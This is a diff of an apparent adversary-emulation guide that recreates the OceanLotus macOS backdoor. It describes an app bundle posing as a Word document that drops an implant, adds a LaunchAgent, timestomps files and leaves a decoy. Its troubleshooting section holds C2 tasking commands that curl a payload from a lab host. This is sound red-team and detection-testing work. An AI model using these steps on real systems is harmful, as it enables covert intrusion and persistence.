@@ -150,7 +150,7 @@ Open **four** terminal windows on your local machine (assuming a macOS or simila
 1. :arrow_right: Enter the same password from above... manualy. The user's Desktop should appear.
 1. Click on the Downloads folder in the Dock located at the base of the Desktop. When the icon expands, select "Open in Finder". A Finder window will open displaying the contents of the Downloads folder.
 
-   >The Dock is the macOS version of a Window's toolbar, Finder is the macOS of Windows Explorer, and the Downloads folder is typcially located to the left side of the Trash icon in the Dock.
+   >The Dock is the macOS version of a Window's toolbar, Finder is the macOS of Windows Explorer, and the Downloads folder is typically located to the left side of the Trash icon in the Dock.
 
 1. Verify the conkylan.app file (unicorn in Vietnamese) is present in the Downloads folder. 
 
@@ -171,30 +171,29 @@ Open **four** terminal windows on your local machine (assuming a macOS or simila
 ## Step 1 - Establish Foothold
 ### 📖 Overview
 
-👋 Handwaving: Assume the user downloaded a word document from a legitimate, but compromised, site. The word docuement (`conkylan.app` - unicorn in Vietnamese) resides on the user's `Downloads` folder. 
+👋 Handwaving: Assume the user downloaded a Word document from a legitimate, but compromised, site. The Word docuement (`conkylan.app` - unicorn in Vietnamese) resides on the user's `Downloads` folder. 
 
 **Step 1** emulates OceanLotus gaining initial access via a malicious file [T1204.002](https://attack.mitre.org/techniques/T1204/002/) targeting user `hpotter`. 
 
-Thinking it's a normal word document, the user, Hope Potter (hpotter), double-clicks the conkylan.app (note: We were not able to disguise the app as a word document using a homoglyph file extension due to OS updates 🙌 🍎). The word document is actually an Application bundle, the first stage payload, which executes the second stage payload. deploys a decoy word document, and connects to the C2 server.
+Thinking it's a normal Word document, the user, Hope Potter (hpotter), double-clicks the conkylan.app (note: We were not able to disguise the app as a Word document using a homoglyph file extension due to OS updates 🙌 🍎). The Word document is actually an Application bundle, the first stage payload, which executes the second stage payload, deploys a decoy Word document, and connects to the C2 server.
 
-The first stage payload is an Application bundle that sets up the enviornment for execution through ensuring the second stage payload (Implant) can be dropped and executed. When opened, the first stage payload uses a bash script to perform the following actions.
+The first stage payload is an Application bundle that sets up the environment for execution through ensuring the second stage payload (Implant) can be dropped and executed. When opened, the first stage payload uses a bash script to perform the following actions.
    - Removes quarantine flag on files within the application bundle
-   - Extracts, base64 decodes, and executes the embedded Implant (Second Stage) payload
-   - Installs persistence via LaunchAgent or LaunchDaemon
+   - Installs persistence via LaunchAgent
+   - Extracts and base64 decodes the embedded Implant (Second Stage) payload and its Communication Library component as `/Users/hpotter/Library/WebKit/com.apple.launchpad` and `/Users/hpotter/Library/WebKit/b2NlYW5sb3R1czIz`, respectively
    - Uses touch to update the timestamps of the Implant (Second Stage) artifacts
    - Uses chmod to make the Implant (Second Stage) binary file executable by changing file permissions to 755
+   - Executes the Implant (Second Stage) binary
    - Replaces the application bundle with the decoy Word document
-      
    
 The Implant is a fat binary that performs the backdoor capabilities. On execution, the Implant automatically performs the following actions:
    - Collects OS information
    - Registers with C2 server
-   - Deploys a Decoy Word document with a Microsoft Word icon
 
 ---
 ### 👾 Red Team Procedures
 
-1. Emulate the user double-clicking the conkylan.app (lets pretend it's a word document)
+1. Emulate the user double-clicking the conkylan.app (lets pretend it's a Word document)
 1. Confirm C2 Registration of the OSX implant 
    In the Listener terminal window you should see the following output...
 
@@ -281,14 +280,15 @@ The Implant is a fat binary that performs the backdoor capabilities. On executio
    | Red Team Activity | Source Code Link | ATT&CK Technique | Relevant CTI Report |
    | ----------------- | ---------------- | ---------------- | ------------------- |
    | Legitimate user opens conkylan.app | - | T1204.002 User Execution: Malicious File | https://unit42.paloaltonetworks.com/unit42-new-improved-macos-backdoor-oceanlotus/<br><br>https://www.trendmicro.com/en_us/research/20/k/new-macos-backdoor-connected-to-oceanlotus-surfaces.html | 
-   | conkylan.app masquerades as a Word document | [Application bundle build script](../Resources/OSX.OceanLotus/Applicationbundle/build_bundle.sh) | T1036.008 Masquerading: Masquerade File Type | https://unit42.paloaltonetworks.com/unit42-new-improved-macos-backdoor-oceanlotus/<br><br>https://www.trendmicro.com/en_us/research/20/k/new-macos-backdoor-connected-to-oceanlotus-surfaces.html |
-   | conkylan.app executes a shell script | [First stage script](../Resources/OSX.OceanLotus/Applicationbundle/first_stage.sh) | T1059.004 Command and Scripting Interpreter: Unix Shell | https://www.trendmicro.com/en_us/research/20/k/new-macos-backdoor-connected-to-oceanlotus-surfaces.html |
-   | Application bundle shell script removes the quarantine flag on the application bundle contents | [Script removes quarantine flag](..Resources/OSX.OceanLotus/Applicationbundle/first_stage.sh#L50-L53) | T1222.002 File and Directory Permissions Modification: Linux and Mac File and Directory Permissions Modification | https://www.trendmicro.com/en_us/research/20/k/new-macos-backdoor-connected-to-oceanlotus-surfaces.html |
-   | Application bundle shell script adds a Launch Agent configuration | [Script copies Launch Agent plist configuration to user's LaunchAgents](../Resources/OSX.OceanLotus/Applicationbundle/first_stage.sh#L68-L83) | T1543.001 Create or Modify System Process: Launch Agent | https://unit42.paloaltonetworks.com/unit42-new-improved-macos-backdoor-oceanlotus/<br><br>https://www.trendmicro.com/en_us/research/20/k/new-macos-backdoor-connected-to-oceanlotus-surfaces.html<br><br>https://www.trendmicro.com/en_us/research/18/d/new-macos-backdoor-linked-to-oceanlotus-found.html |
-   | Application bundle shell script drops Communication dylib and implant binary | [Script echos and writes the base64 decoded payload to disk](../Resources/OSX.OceanLotus/Applicationbundle/first_stage.sh#L85-L90) | - | https://www.trendmicro.com/en_us/research/20/k/new-macos-backdoor-connected-to-oceanlotus-surfaces.html |
-   | Application bundle shell script executes `touch`` | [Script modifies file timestamps](../Resources/OSX.OceanLotus/Applicationbundle/first_stage.sh#L92-L98) | T1070.006 Indicator Removal: Timestomp | https://www.trendmicro.com/en_us/research/20/k/new-macos-backdoor-connected-to-oceanlotus-surfaces.html |
-   | Application bundle shell script adds executable bit to dropped implant binary | [Script makes implant binary executable](../Resources/OSX.OceanLotus/Applicationbundle/first_stage.sh#L50-L53) | T1222.002 File and Directory Permissions Modification: Linux and Mac File and Directory Permissions Modification | https://www.trendmicro.com/en_us/research/20/k/new-macos-backdoor-connected-to-oceanlotus-surfaces.html |
-   | Application bundle shell script deletes application bundle, replacing it with a decoy document | [Script deletes application bundle](../Resources/OSX.OceanLotus/Applicationbundle/first_stage.sh#L101) | T1070 Indicator Removal: File Deletion | https://unit42.paloaltonetworks.com/unit42-new-improved-macos-backdoor-oceanlotus/<br><br>https://www.trendmicro.com/en_us/research/20/k/new-macos-backdoor-connected-to-oceanlotus-surfaces.html |
+   | conkylan.app masquerades as a Word document | [Application bundle build script](../Resources/OSX.OceanLotus/ApplicationBundle/build_bundle.sh) | T1036.008 Masquerading: Masquerade File Type | https://unit42.paloaltonetworks.com/unit42-new-improved-macos-backdoor-oceanlotus/<br><br>https://www.trendmicro.com/en_us/research/20/k/new-macos-backdoor-connected-to-oceanlotus-surfaces.html |
+   | conkylan.app executes a shell script | [First stage script](../Resources/OSX.OceanLotus/ApplicationBundle/first_stage.sh) | T1059.004 Command and Scripting Interpreter: Unix Shell | https://www.trendmicro.com/en_us/research/20/k/new-macos-backdoor-connected-to-oceanlotus-surfaces.html |
+   | Application bundle shell script removes the quarantine flag on the application bundle contents | [Script removes quarantine flag](..Resources/OSX.OceanLotus/ApplicationBundle/first_stage.sh#L50-L53) | T1222.002 File and Directory Permissions Modification: Linux and Mac File and Directory Permissions Modification | https://www.trendmicro.com/en_us/research/20/k/new-macos-backdoor-connected-to-oceanlotus-surfaces.html |
+   | Application bundle shell script adds a Launch Agent configuration | [Script copies Launch Agent plist configuration to user's LaunchAgents](../Resources/OSX.OceanLotus/ApplicationBundle/first_stage.sh#L68-L83) | T1543.001 Create or Modify System Process: Launch Agent | https://unit42.paloaltonetworks.com/unit42-new-improved-macos-backdoor-oceanlotus/<br><br>https://www.trendmicro.com/en_us/research/20/k/new-macos-backdoor-connected-to-oceanlotus-surfaces.html<br><br>https://www.trendmicro.com/en_us/research/18/d/new-macos-backdoor-linked-to-oceanlotus-found.html |
+   | Application bundle shell script contains embedded base64 encoded binaries | [Script contains base64 encoded Implant and Communication Library binaries](../Resources/OSX.OceanLotus/ApplicationBundle/first_stage.sh#L38-L41) | T1027.009 Embedded Payloads | https://www.trendmicro.com/en_us/research/20/k/new-macos-backdoor-connected-to-oceanlotus-surfaces.html |
+   | Application bundle shell script drops Communication dylib and implant binary | [Script echos and writes the base64 decoded payload to disk](../Resources/OSX.OceanLotus/ApplicationBundle/first_stage.sh#L85-L90) | - | https://www.trendmicro.com/en_us/research/20/k/new-macos-backdoor-connected-to-oceanlotus-surfaces.html |
+   | Application bundle shell script executes `touch`` | [Script modifies file timestamps](../Resources/OSX.OceanLotus/ApplicationBundle/first_stage.sh#L92-L98) | T1070.006 Indicator Removal: Timestomp | https://www.trendmicro.com/en_us/research/20/k/new-macos-backdoor-connected-to-oceanlotus-surfaces.html |
+   | Application bundle shell script adds executable bit to dropped implant binary | [Script makes implant binary executable](../Resources/OSX.OceanLotus/ApplicationBundle/first_stage.sh#L50-L53) | T1222.002 File and Directory Permissions Modification: Linux and Mac File and Directory Permissions Modification | https://www.trendmicro.com/en_us/research/20/k/new-macos-backdoor-connected-to-oceanlotus-surfaces.html |
+   | Application bundle shell script deletes application bundle, replacing it with a decoy document | [Script deletes application bundle](../Resources/OSX.OceanLotus/ApplicationBundle/first_stage.sh#L101) | T1070 Indicator Removal: File Deletion | https://unit42.paloaltonetworks.com/unit42-new-improved-macos-backdoor-oceanlotus/<br><br>https://www.trendmicro.com/en_us/research/20/k/new-macos-backdoor-connected-to-oceanlotus-surfaces.html |
    | OSX.OceanLotus loads the dropped Communication dylib | [`loadComms`](../Resources/OSX.OceanLotus/Implant/Implant/main.cpp#L40-L99) | - | https://www.welivesecurity.com/2019/04/09/oceanlotus-macos-malware-update/ |
    | OSX.OceanLotus implant leverages API calls from IOKit | [Calls to IOKit APIs](../Resources/OSX.OceanLotus/Implant/Implant/ClientPP.cpp#L35-L50) | T1106 Native API | |
    | OSX.OceanLotus implant retrieves IOPlatformSerialNumber| [Get IOPlatformSerialNumber](../Resources/OSX.OceanLotus/Implant/Implant/ClientPP.cpp#L302) | T1082 System Information Discovery | https://www.welivesecurity.com/2019/04/09/oceanlotus-macos-malware-update/<br><br>https://www.trendmicro.com/en_us/research/20/k/new-macos-backdoor-connected-to-oceanlotus-surfaces.html |
@@ -437,39 +437,36 @@ Execute Rota Jakiro
    ```
    💡 All files are downloaded to the directory where the OSX implant binary is running, `/Users/hpotter/Library/WebKit`, as `osx.download`. `/Users/hpotter/Library/WebKit` is where the OSX implant binary is dropped from the application bundle.
    
-   <details>
-      <summary>Trouble Shooting</summary>
+<details>
+    <summary>Trouble Shooting</summary>
+      
+    On the C2 server start a simple HTTP server
 
-      ---
-      
-      On the C2 server start a simple HTTP server
-      
-      ```
-      cd /opt/oceanlotus/Resources/payloads
-      ```
-      
-      <br>
-      
-      ```
-      python3 -m http.server
-      ```
-      
-      Task the implant
-      
-      ```
-      ./evalsC2client.py --set-task b6dbd70f203515095d0ca8a5ecbb43f7 '{"cmd":"OSX_run_cmd", "arg":"curl 10.90.30.26:8000/rota -o /tmp/rota"}'
-      ```
-      
-      Veify the file downloaded
-      
-      ```
-      ./evalsC2client.py --set-task b6dbd70f203515095d0ca8a5ecbb43f7 '{"cmd":"OSX_run_cmd", "arg":"ls -la /tmp/rota"}'
-      ```
-      End Troubleshooting
-   
-      ---
+    ```
+    cd /opt/oceanlotus/Resources/payloads
+    ```
 
-   </details>
+    <br>
+
+    ```
+    python3 -m http.server
+    ```
+
+    Task the implant
+
+    ```
+    ./evalsC2client.py --set-task b6dbd70f203515095d0ca8a5ecbb43f7 '{"cmd":"OSX_run_cmd", "arg":"curl 10.90.30.26:8000/rota -o /tmp/rota"}'
+    ```
+
+    Verify the file downloaded
+
+    ```
+    ./evalsC2client.py --set-task b6dbd70f203515095d0ca8a5ecbb43f7 '{"cmd":"OSX_run_cmd", "arg":"ls -la /tmp/rota"}'
+    ```
+    End Troubleshooting
+
+    ---
+</details>
 
 1. Task OceanLotus to SCP the Rota Jakiro implant to the Linux host
    ```
